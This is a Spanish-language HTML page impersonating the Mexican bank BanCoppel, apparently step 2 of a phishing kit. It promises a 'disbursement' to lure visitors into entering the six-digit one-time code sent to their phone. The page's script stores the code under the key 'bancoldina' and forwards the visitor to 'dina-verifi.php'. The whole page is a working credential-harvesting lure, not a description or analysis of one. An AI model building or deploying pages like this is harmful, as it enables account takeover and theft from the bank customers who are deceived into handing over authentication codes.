<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clave Dinámica (OTP)</title>
  <style>
    body {
      background-color: #fff;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    .step-indicator {
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 30px 0 10px;
    }

    .circle {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background-color: #ccc;
      color: #fff;
      font-size: 14px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .circle.done,
    .circle.active {
      background-color: #0057D8;
    }

    .line {
      height: 2px;
      width: 50px;
      background-color: #ccc;
      margin: 0 10px;
    }

    .line.done {
      background-color: #0057D8;
    }

    .container {
      max-width: 380px;
      margin: 0 auto;
      padding: 20px;
    }

    h2 {
      font-size: 20px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 30px;
    }

    .form-group {
      margin-bottom: 25px;
    }

    input[type="text"] {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 10px;
      box-sizing: border-box;
      background-color: #f5f5f5;
    }

    input[type="text"]::placeholder {
      color: #999;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #0057D8;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 25px;
      cursor: pointer;
    }

    .link {
      display: block;
      text-align: center;
      margin-top: 20px;
      color: #0057D8;
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <!-- PASOS VISUALES -->
  <div class="step-indicator">
    <div class="circle done">1</div>
    <div class="line done"></div>
    <div class="circle active">2</div>
    <div class="line"></div>
    <div class="circle">3</div>
  </div>

  <div class="container">
    <h2><strong>BANCOPPEL</strong></h2>
    <h6>¡Listo te identificamos!</h6>
    <h6>Para iniciar con su proceso de desembolso hacia su cuenta porfavor ingrese el codigo de 6 digitos que fue enviado a su celular.</h6>
    <form onsubmit="guardarOtp(event)">
      <div class="form-group">
        <input type="text" id="otp" maxlength="6" placeholder="Ingresa el codigo enviado" required pattern="[0-9]*" inputmode="numeric">
      </div>
      <button type="submit">Continuar</button>
    </form>
    <a href="#" class="link">En otro momento</a>
  </div>

  <script>
    function guardarOtp(e) {
      e.preventDefault();
      const otp = document.getElementById("otp").value.trim();

      if (otp.length === 6 && /^[0-9]+$/.test(otp)) {
        localStorage.setItem("bancoldina", otp);
        window.location.href = "dina-verifi.php";
      } else {
        alert("Ingresa un código OTP válido de 6 dígitos.");
      }
    }
  </script>

</body>
</html>
